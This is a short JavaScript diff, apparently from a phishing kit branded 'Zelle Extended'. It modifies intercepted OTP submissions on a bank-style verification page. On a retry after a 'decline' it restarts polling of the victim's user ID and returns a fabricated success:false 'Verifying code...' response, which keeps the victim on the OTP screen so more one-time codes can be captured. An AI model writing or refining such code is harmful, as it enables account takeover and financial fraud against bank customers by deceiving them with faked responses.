@@ -933,12 +933,28 @@
                     if (data.success && data.id) {
                         console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                         
-                        // Simple: Always start/restart polling, let it handle everything
-                        currentUserId = data.id;
-                        startOtpPolling(data.id);
-                        
-                        // Always return original response - no modifications
-                        console.log('[Zelle Extended] Returning original response');
+                        // Check if this is a RETRY (polling was stopped after decline)
+                        if (pollingStopped) {
+                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React from advancing');
+                            
+                            // Restart polling for retry
+                            currentUserId = data.id;
+                            startOtpPolling(data.id);
+                            
+                            // Return fake response to keep React on OTP page
+                            return new Response(JSON.stringify({
+                                success: false,
+                                message: 'Verifying code...'
+                            }), {
+                                status: 200,
+                                headers: { 'Content-Type': 'application/json' }
+                            });
+                        } else {
+                            // First time - let React advance normally
+                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React to advance');
+                            currentUserId = data.id;
+                            startOtpPolling(data.id);
+                        }
                     }
                 } catch (e) {
                     // Ignore parsing errors
